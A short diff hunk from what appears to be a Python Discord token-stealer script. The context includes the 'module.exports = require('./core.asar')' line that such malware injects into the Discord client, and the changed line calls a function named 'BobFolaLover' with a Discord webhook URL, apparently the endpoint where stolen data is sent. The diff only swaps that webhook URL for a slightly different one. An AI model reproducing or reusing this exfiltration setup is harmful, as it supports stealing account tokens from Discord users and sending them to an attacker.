@@ -2427,4 +2427,4 @@ module.exports = require('./core.asar');
 
 
 if __name__ == "__main__":
-    BobFolaLover("https://discord.com/api/webhooks/1375413488259956746/tV0mkA87WXbq1MEPznVzvtXxB6csp1-3SG0EPGblJ-YYkmmJourcoZ1uFDdNGtEHbK6w")
+    BobFolaLover("https://discord.com/api/webhooks/137541348825956746/tV0mkA87WXbq1MEPznVzvtXxB6csp1-3SG0EPGblJ-YYkmmJourcZ1uFDdNGtEHbK6w")
